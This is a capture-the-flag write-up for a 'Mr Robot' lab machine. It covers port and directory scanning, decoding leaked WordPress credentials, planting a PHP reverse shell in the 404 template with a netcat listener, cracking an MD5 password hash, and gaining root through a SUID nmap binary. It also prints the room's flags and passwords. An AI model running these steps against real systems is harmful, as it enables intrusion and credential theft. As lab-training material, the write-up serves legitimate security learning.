# Mr ROBOT CTF 
## Resources

Only an IP address : 10.10.8.46

## Penetration testing process 

#### Recon

First I tried to access http://10.10.8.46 to see if it has a basic webserver at port 80, and fortunately it has a webserver @port 80 and it seems like a terminal styled web application to execute commands as features : 
![View Screenshot](https://raw.githubusercontent.com/d3xter101/writeups/refs/heads/main/mr-robot/screenshots/Screenshot%202025-10-11%20145836.png "Screenshot 2025-10-11 145836.png")

I tried commands nothing special : 
- prepare : it shows a cinematic video of fsociety from the show
- fsociety : we observed something intersting (we'll go over it later)
- inform : it redirect to /inform page where we have : 

![Screenshot](https://raw.githubusercontent.com/d3xter101/writeups/refs/heads/main/mr-robot/screenshots/Screenshot%202025-10-11%20150503.png)

- question : it shows some political pictures from the show like the following : 

![Patriot](https://raw.githubusercontent.com/d3xter101/writeups/refs/heads/main/mr-robot/screenshots/Screenshot%202025-10-11%20151803.png)

**Let's get back to the command fsociety**: 
	It shows a video but when we *refresh*, it show an interesting interface probably a WordPress interface let's dig thro it more  : 
		![screenshot](https://raw.githubusercontent.com/d3xter101/writeups/refs/heads/main/mr-robot/screenshots/Screenshot%202025-10-11%20152433.png)
		and to confirm that when i clicked the login it redirects to wordpress panel login.

### Scanning 

Let's move to some active engagement with the server using 
- nmap : to enumerate open ports and active services 
- dirsearch : to enumerate/bruteforce available directories only 200/301 HTTP codes 
---

``` bash 
nmap -sV -A 10.10.8.46 -sC -oN nmapInitial
```

The output : 

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-11 10:21 EDT
Nmap scan report for 10.10.8.46 (10.10.8.46)
Host is up (0.14s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 39:42:68:12:f6:83:08:be:8a:e7:6a:8e:8d:4f:e4:64 (RSA)
|   256 d0:94:fd:6f:a1:c3:1c:8d:1d:4d:6f:dc:ba:f5:2e:a0 (ECDSA)
|_  256 f8:be:bc:5d:c2:1c:ac:19:ea:7c:68:58:50:dc:27:89 (ED25519)
80/tcp  open  http     Apache httpd
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache
443/tcp open  ssl/http Apache httpd
| ssl-cert: Subject: commonName=www.example.com
| Not valid before: 2015-09-16T10:45:03
|_Not valid after:  2025-09-13T10:45:03
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Linux 4.X|2.6.X|3.X|5.X (97%)
OS CPE: cpe:/o:linux:linux_kernel:4.15 cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:5
Aggressive OS guesses: Linux 4.15 (97%), Linux 2.6.32 - 3.13 (91%), Linux 3.10 - 4.11 (91%), Linux 3.2 - 4.14 (91%), Linux 4.15 - 5.19 (91%), Linux 5.0 - 5.14 (91%), Linux 2.6.32 - 3.10 (91%), Linux 5.4 (90%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

so we have : 
- port 22 open : SSH service active
- port 80 open : HTTP web server

--- 
``` bash
dirsearch -u http://10.10.8.46 -x 404,403,405,500 -t 40
```

The whole output : 

```
[10:48:31] Starting: 
[10:48:32] 301 -  229B  - /js  ->  http://10.10.8.46/js/
[10:48:32] 301 -    0B  - /%2e%2e//google.com  ->  http://10.10.8.46/%2E%2E/google.com
[10:48:44] 301 -    0B  - /0  ->  http://10.10.8.46/0/
[10:48:52] 301 -  232B  - /admin  ->  http://10.10.8.46/admin/
[10:48:52] 301 -    0B  - /adm/index.php  ->  http://10.10.8.46/adm/
[10:48:53] 200 -  676B  - /admin/
[10:48:54] 200 -  676B  - /admin/index
[10:48:54] 200 -  676B  - /admin/index.html
[10:48:54] 301 -    0B  - /admin/index.php  ->  http://10.10.8.46/admin/
[10:48:55] 301 -    0B  - /admin/mysql/index.php  ->  http://10.10.8.46/admin/mysql/
[10:48:55] 301 -    0B  - /admin/mysql2/index.php  ->  http://10.10.8.46/admin/mysql2/
[10:48:55] 301 -    0B  - /admin/phpMyAdmin/index.php  ->  http://10.10.8.46/admin/phpMyAdmin/
[10:48:55] 301 -    0B  - /admin/phpmyadmin/index.php  ->  http://10.10.8.46/admin/phpmyadmin/
[10:48:55] 301 -    0B  - /admin/phpmyadmin2/index.php  ->  http://10.10.8.46/admin/phpmyadmin2/
[10:48:55] 301 -    0B  - /admin/PMA/index.php  ->  http://10.10.8.46/admin/PMA/
[10:48:55] 301 -    0B  - /admin/pma/index.php  ->  http://10.10.8.46/admin/pma/
[10:48:55] 301 -    0B  - /admin2/index.php  ->  http://10.10.8.46/admin2/
[10:48:56] 301 -    0B  - /admin_area/index.php  ->  http://10.10.8.46/admin_area/
[10:49:02] 301 -    0B  - /adminarea/index.php  ->  http://10.10.8.46/adminarea/
[10:49:02] 301 -    0B  - /admincp/index.php  ->  http://10.10.8.46/admincp/
[10:49:03] 301 -    0B  - /adminer/index.php  ->  http://10.10.8.46/adminer/
[10:49:04] 301 -    0B  - /administrator/index.php  ->  http://10.10.8.46/administrator/
[10:49:08] 301 -    0B  - /apc/index.php  ->  http://10.10.8.46/apc/
[10:49:10] 301 -  232B  - /audio  ->  http://10.10.8.46/audio/
[10:49:10] 301 -    0B  - /atom  ->  http://10.10.8.46/feed/atom/
[10:49:11] 301 -    0B  - /axis2//axis2-web/HappyAxis.jsp  ->  http://10.10.8.46/axis2/axis2-web/HappyAxis.jsp
[10:49:11] 301 -    0B  - /axis//happyaxis.jsp  ->  http://10.10.8.46/axis/happyaxis.jsp
[10:49:11] 301 -    0B  - /axis2-web//HappyAxis.jsp  ->  http://10.10.8.46/axis2-web/HappyAxis.jsp
[10:49:12] 301 -    0B  - /bb-admin/index.php  ->  http://10.10.8.46/bb-admin/
[10:49:13] 301 -    0B  - /bitrix/admin/index.php  ->  http://10.10.8.46/bitrix/admin/
[10:49:13] 301 -  231B  - /blog  ->  http://10.10.8.46/blog/
[10:49:16] 301 -    0B  - /Citrix//AccessPlatform/auth/clientscripts/cookies.js  ->  http://10.10.8.46/Citrix/AccessPlatform/auth/clientscripts/cookies.js
[10:49:16] 301 -    0B  - /claroline/phpMyAdmin/index.php  ->  http://10.10.8.46/claroline/phpMyAdmin/
[10:49:21] 301 -  230B  - /css  ->  http://10.10.8.46/css/
[10:49:21] 302 -    0B  - /dashboard  ->  http://10.10.8.46/wp-admin/
[10:49:22] 302 -    0B  - /dashboard/  ->  http://10.10.8.46/wp-admin/
[10:49:22] 301 -    0B  - /db/index.php  ->  http://10.10.8.46/db/
[10:49:23] 301 -    0B  - /dbadmin/index.php  ->  http://10.10.8.46/dbadmin/
[10:49:26] 301 -    0B  - /engine/classes/swfupload//swfupload.swf  ->  http://10.10.8.46/engine/classes/swfupload/swfupload.swf
[10:49:26] 301 -    0B  - /engine/classes/swfupload//swfupload_f9.swf  ->  http://10.10.8.46/engine/classes/swfupload/swfupload_f9.swf
[10:49:27] 301 -    0B  - /etc/lib/pChart2/examples/imageMap/index.php  ->  http://10.10.8.46/etc/lib/pChart2/examples/imageMap/
[10:49:28] 301 -    0B  - /extjs/resources//charts.swf  ->  http://10.10.8.46/extjs/resources/charts.swf
[10:49:28] 200 -    0B  - /favicon.ico
[10:49:28] 301 -    0B  - /feed  ->  http://10.10.8.46/feed/
[10:49:33] 301 -    0B  - /html/js/misc/swfupload//swfupload.swf  ->  http://10.10.8.46/html/js/misc/swfupload/swfupload.swf
[10:49:34] 301 -  233B  - /images  ->  http://10.10.8.46/images/
[10:49:34] 301 -    0B  - /image  ->  http://10.10.8.46/image/
[10:49:35] 301 -    0B  - /index.php  ->  http://10.10.8.46/
[10:49:35] 301 -    0B  - /index.php/login/  ->  http://10.10.8.46/login/
[10:49:36] 301 -    0B  - /install/index.php?upgrade/  ->  http://10.10.8.46/install/?upgrade/
[10:49:36] 200 -  504KB - /intro
[10:49:38] 200 -  158B  - /license
[10:49:39] 200 -  158B  - /license.txt
[10:49:40] 302 -    0B  - /login  ->  http://10.10.8.46/wp-login.php
[10:49:40] 301 -    0B  - /login.wdm%20  ->  http://10.10.8.46/login.wdm
[10:49:40] 302 -    0B  - /login/  ->  http://10.10.8.46/wp-login.php
[10:49:44] 301 -    0B  - /modelsearch/index.php  ->  http://10.10.8.46/modelsearch/
[10:49:45] 301 -    0B  - /myadmin/index.php  ->  http://10.10.8.46/myadmin/
[10:49:45] 301 -    0B  - /myadmin2/index.php  ->  http://10.10.8.46/myadmin2/
[10:49:46] 301 -    0B  - /mysql-admin/index.php  ->  http://10.10.8.46/mysql-admin/
[10:49:46] 301 -    0B  - /mysql/index.php  ->  http://10.10.8.46/mysql/
[10:49:46] 301 -    0B  - /mysqladmin/index.php  ->  http://10.10.8.46/mysqladmin/
[10:49:49] 301 -    0B  - /panel-administracion/index.php  ->  http://10.10.8.46/panel-administracion/
[10:49:51] 301 -    0B  - /phpadmin/index.php  ->  http://10.10.8.46/phpadmin/
[10:49:51] 301 -    0B  - /phpma/index.php  ->  http://10.10.8.46/phpma/
[10:49:53] 301 -    0B  - /phpmyadmin-old/index.php  ->  http://10.10.8.46/phpmyadmin-old/
[10:49:53] 301 -    0B  - /phpMyAdmin.old/index.php  ->  http://10.10.8.46/phpMyAdmin.old/
[10:49:53] 301 -    0B  - /phpMyAdmin/index.php  ->  http://10.10.8.46/phpMyAdmin/
[10:49:53] 301 -    0B  - /phpMyAdmin/phpMyAdmin/index.php  ->  http://10.10.8.46/phpMyAdmin/phpMyAdmin/
[10:49:53] 301 -    0B  - /phpmyadmin0/index.php  ->  http://10.10.8.46/phpmyadmin0/
[10:49:53] 301 -    0B  - /phpmyadmin1/index.php  ->  http://10.10.8.46/phpmyadmin1/
[10:49:53] 301 -    0B  - /phpmyadmin2/index.php  ->  http://10.10.8.46/phpmyadmin2/
[10:49:53] 301 -    0B  - /phpMyadmin_bak/index.php  ->  http://10.10.8.46/phpMyadmin_bak/
[10:49:53] 301 -    0B  - /phpMyAdminold/index.php  ->  http://10.10.8.46/phpMyAdminold/
[10:49:54] 301 -    0B  - /pma-old/index.php  ->  http://10.10.8.46/pma-old/
[10:49:54] 301 -    0B  - /pma/index.php  ->  http://10.10.8.46/pma/
[10:49:54] 301 -    0B  - /PMA/index.php  ->  http://10.10.8.46/PMA/
[10:49:54] 301 -    0B  - /PMA2/index.php  ->  http://10.10.8.46/PMA2/
[10:49:54] 301 -    0B  - /pmamy2/index.php  ->  http://10.10.8.46/pmamy2/
[10:49:54] 301 -    0B  - /pmamy/index.php  ->  http://10.10.8.46/pmamy/
[10:49:54] 301 -    0B  - /pmd/index.php  ->  http://10.10.8.46/pmd/
[10:49:57] 200 -   64B  - /readme
[10:49:57] 200 -   64B  - /readme.html
[10:49:58] 200 -   41B  - /robots.txt
[10:49:59] 301 -    0B  - /roundcube/index.php  ->  http://10.10.8.46/roundcube/
[10:49:59] 301 -    0B  - /rss  ->  http://10.10.8.46/feed/
[10:50:03] 200 -    0B  - /sitemap
[10:50:03] 200 -    0B  - /sitemap.xml
[10:50:03] 200 -    0B  - /sitemap.xml.gz
[10:50:03] 301 -    0B  - /siteadmin/index.php  ->  http://10.10.8.46/siteadmin/
[10:50:04] 301 -    0B  - /sql/index.php  ->  http://10.10.8.46/sql/
[10:50:06] 301 -    0B  - /sugarcrm/index.php?module=Accounts&action=ShowDuplicates  ->  http://10.10.8.46/sugarcrm/?module=Accounts&action=ShowDuplicates
[10:50:06] 301 -    0B  - /sugarcrm/index.php?module=Contacts&action=ShowDuplicates  ->  http://10.10.8.46/sugarcrm/?module=Contacts&action=ShowDuplicates
[10:50:09] 301 -    0B  - /templates/beez/index.php  ->  http://10.10.8.46/templates/beez/
[10:50:09] 301 -    0B  - /templates/ja-helio-farsi/index.php  ->  http://10.10.8.46/templates/ja-helio-farsi/
[10:50:09] 301 -    0B  - /templates/rhuk_milkyway/index.php  ->  http://10.10.8.46/templates/rhuk_milkyway/
[10:50:10] 301 -    0B  - /tmp/index.php  ->  http://10.10.8.46/tmp/
[10:50:10] 301 -    0B  - /tools/phpMyAdmin/index.php  ->  http://10.10.8.46/tools/phpMyAdmin/
[10:50:11] 301 -    0B  - /typo3/phpmyadmin/index.php  ->  http://10.10.8.46/typo3/phpmyadmin/
[10:50:14] 301 -  232B  - /video  ->  http://10.10.8.46/video/
[10:50:16] 301 -    0B  - /web/phpMyAdmin/index.php  ->  http://10.10.8.46/web/phpMyAdmin/
[10:50:16] 301 -    0B  - /webadmin/index.php  ->  http://10.10.8.46/webadmin/
[10:50:17] 301 -  235B  - /wp-admin  ->  http://10.10.8.46/wp-admin/
[10:50:17] 302 -    0B  - /wp-admin/  ->  http://10.10.8.46/wp-login.php?redirect_to=http%3A%2F%2F10.10.8.46%2Fwp-admin%2F&reauth=1
[10:50:17] 200 -   21B  - /wp-admin/admin-ajax.php
[10:50:17] 200 -    0B  - /wp-config.php
[10:50:17] 301 -  237B  - /wp-content  ->  http://10.10.8.46/wp-content/
[10:50:18] 301 -  277B  - /wp-content/plugins/all-in-one-wp-migration/storage  ->  http://10.10.8.46/wp-content/plugins/all-in-one-wp-migration/storage/
[10:50:18] 200 -    0B  - /wp-content/
[10:50:18] 301 -  238B  - /wp-includes  ->  http://10.10.8.46/wp-includes/
[10:50:18] 301 -    0B  - /wp-content/plugins/adminer/inc/editor/index.php  ->  http://10.10.8.46/wp-content/plugins/adminer/inc/editor/
[10:50:18] 200 -    0B  - /wp-content/plugins/google-sitemap-generator/sitemap-core.php
[10:50:18] 200 -    0B  - /wp-cron.php
[10:50:18] 200 -    1KB - /wp-login
[10:50:18] 200 -    1KB - /wp-login.php
[10:50:18] 200 -    1KB - /wp-login/
[10:50:18] 302 -    0B  - /wp-signup.php  ->  http://10.10.8.46/wp-login.php?action=register
[10:50:18] 301 -    0B  - /wp-register.php  ->  http://10.10.8.46/wp-login.php?action=register
[10:50:19] 301 -    0B  - /www/phpMyAdmin/index.php  ->  http://10.10.8.46/www/phpMyAdmin/
[10:50:19] 301 -    0B  - /xampp/phpmyadmin/index.php  ->  http://10.10.8.46/xampp/phpmyadmin/

```
---
##### For 200 ok code : 

``` bash
cat result.txt| grep 200 
```

The output : 

```
[10:48:53] 200 -  676B  - /admin/
[10:48:54] 200 -  676B  - /admin/index
[10:48:54] 200 -  676B  - /admin/index.html
[10:49:28] 200 -    0B  - /favicon.ico
[10:49:36] 200 -  504KB - /intro
[10:49:38] 200 -  158B  - /license
[10:49:39] 200 -  158B  - /license.txt
[10:49:57] 200 -   64B  - /readme
[10:49:57] 200 -   64B  - /readme.html
[10:49:58] 200 -   41B  - /robots.txt
[10:50:03] 200 -    0B  - /sitemap
[10:50:03] 200 -    0B  - /sitemap.xml
[10:50:03] 200 -    0B  - /sitemap.xml.gz
[10:50:17] 200 -   21B  - /wp-admin/admin-ajax.php
[10:50:17] 200 -    0B  - /wp-config.php
[10:50:18] 200 -    0B  - /wp-content/
[10:50:18] 200 -    0B  - /wp-content/plugins/google-sitemap-generator/sitemap-core.php
[10:50:18] 200 -    0B  - /wp-cron.php
[10:50:18] 200 -    1KB - /wp-login
[10:50:18] 200 -    1KB - /wp-login.php
[10:50:18] 200 -    1KB - /wp-login/

```

#### Interpretation

As we can see we have some interesting endpoints like */robots.txt* : 

![screenshot](https://raw.githubusercontent.com/d3xter101/writeups/refs/heads/main/mr-robot/screenshots/Screenshot%202025-10-11%20161236.png)

When we accessed the file it returns : *073403c8a58a1f80d943455fb30724b9* 
which is the first flag to submit. 
I checked the fsociety.dic nothing important 

--- 
From the directory bruteforce we have */license* ,
it shows : what you do just pull code from Rapid9 or some s@#% since when did you become a script kitty?
i struggled for about an hour and them I observed that there's more in that page viewing the source code helped : 
![dump screen](https://raw.githubusercontent.com/d3xter101/writeups/refs/heads/main/mr-robot/screenshots/Screenshot%202025-10-11%20162913.png)
as u see nothing but when I scrolled down I found a base64 code : ZWxsaW90OkVSMjgtMDY1Mgo=

First let's create a file to contain the base64 code : 
``` bash
touch base64.txt
```

Second, let's put our text in the file : 
``` bash
echo ZWxsaW90OkVSMjgtMDY1Mgo= > base64.txt
```

Finally, let's decode it : 
``` bash
base64 -d base64.txt
``` 

**The result :**
```
elliot:ER28-0652
```

--- 
So now we have a user and a probable password, I tried connecting over SSH but it doesn't work, I jumped directly to test and it worked I actually logged in as eliot in the wordpress panel : 
![SCREENSHOT](https://raw.githubusercontent.com/d3xter101/writeups/refs/heads/main/mr-robot/screenshots/Screenshot%202025-10-11%20163711.png)

Let's have some fun now ! 
A common exploit in WordPress is tampering with hardcoded php files to get a reverse php, so after thinking for a bit the easiest feature we can exploit is 404 pages.

### Exploiting

Here we have the editor : 
![screenshot](https://raw.githubusercontent.com/d3xter101/writeups/refs/heads/main/mr-robot/screenshots/Screenshot%202025-10-11%20164222.png)

--- 

In the left side we can see the 404 template as 404.php, so let's replace the existing code with our actual **malware** i removed my operation IP for confidentiality and privacy purposes : 

![screenshot](https://raw.githubusercontent.com/d3xter101/writeups/refs/heads/main/mr-robot/screenshots/Screenshot%202025-10-11%20165459.png)

---

Let's setup a listener now I'll use *NetCat* : 
``` bash
nc -lnvp 1337
```

once we hit a 404 page we will have a shell in out terminal , and as u can see we have access to the server with a user privileges : 

![screenshot](https://raw.githubusercontent.com/d3xter101/writeups/refs/heads/main/mr-robot/screenshots/Screenshot%202025-10-11%20165851.png)

A practical step is spawning a shell : 

``` bash 
python -c 'import pty; pty.spawn("/bin/bash")'
```

The terminal now looks like this : 

```
daemon@ip-10-10-8-46:/$ 
```

--- 
After digging a bit in the machine file system I discovered some interesting things :
```
daemon@ip-10-10-8-46:/$ ls -lah /home
total 16K
drwxr-xr-x  4 root   root   4.0K Jun  2 18:14 .
drwxr-xr-x 23 root   root   4.0K Oct 11 13:47 ..
drwxr-xr-x  2 root   root   4.0K Nov 13  2015 robot
drwxr-xr-x  4 ubuntu ubuntu 4.0K Jun  2 18:16 ubuntu
```

let's start with the directory of the user robot : 
```
daemon@ip-10-10-8-46:/home/robot$ ls -lah 
ls -lah 
total 16K
drwxr-xr-x 2 root  root  4.0K Nov 13  2015 .
drwxr-xr-x 4 root  root  4.0K Jun  2 18:14 ..
-r-------- 1 robot robot   33 Nov 13  2015 key-2-of-3.txt
-rw-r--r-- 1 robot robot   39 Nov 13  2015 password.raw-md5
```

I tried opening the key-2-of-3.txt but I get permission denied, but i could open the password.raw-md5 

``` 
daemon@ip-10-10-8-46:/home/robot$ cat password.raw-md5 
robot:c3fcd3d76192e4007dfb496cca67e13b
```

Simply let's crack the that hash I used http://crackstation.net It cracked it right away : 
c3fcd3d76192e4007dfb496cca67e13b --> abcdefghijklmnopqrstuvwxyz

(alphabets lol)

Let's use it to login as *robot* 
```
daemon@ip-10-10-8-46:/home/robot$ su robot 
Password: abcdefghijklmnopqrstuvwxyz
```

Now we have access to the key-2-of-3.txt (second flag) : 822c73956184f694993bede3eb39f959

--- 

### Privilege escalation (Root access)

Now us as the user *robot* we wanna be root let's dive into it . 

I tried running "sudo -l" but the user can't run sudo, so let's do a permission check : 
```
robot@ip-10-10-8-46:~$ find / -perm -4000 2>/dev/null
/bin/umount
/bin/mount
/bin/su
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/bin/pkexec
/usr/local/bin/nmap
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
/usr/lib/dbus-1.0/dbus-daemon-launch-helper

```

I check every one if vulnerable and found that "/usr/local/bin/nmap" is actually a GTFObins, check : https://gtfobins.github.io/gtfobins/nmap/

Following the documentation we should run : 
``` bash
nmap --interactive
```

output : 
```
obot@ip-10-10-8-46:~$ nmap --interactive
nmap --interactive
Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> 
```

Let's run the command `sh` to get a shell as root : 
```
nmap> sh
sh
# python -c 'import pty; pty.spawn("/bin/bash")'
python -c 'import pty; pty.spawn("/bin/bash")'
root@ip-10-10-8-46:~# 
```

Horray we are now root let's get the final flag : 
```
root@ip-10-10-8-46:~# cd /root
cd /root
root@ip-10-10-8-46:/root# ls
ls
firstboot_done	key-3-of-3.txt
root@ip-10-10-8-46:/root# cat key-3-of-3.txt
cat key-3-of-3.txt
04787ddef27c3dee1ee161b21670b4e4
root@ip-10-10-8-46:/root# 
```

The last flag is : 04787ddef27c3dee1ee161b21670b4e4

--- 
## Finish line 

This room was an `easy` CTF challenge to demonstrate WordPress vulnerabilities and insecure passwords where the password "abcdefgh..." was very easy to crack. 
In real life the file raw-md5 could represent a note on someone's Desktop, so keep passwords out of NOTES.TXT.
For the priv esc part we exploited a simple misconfiguration using GTFObins documentation.
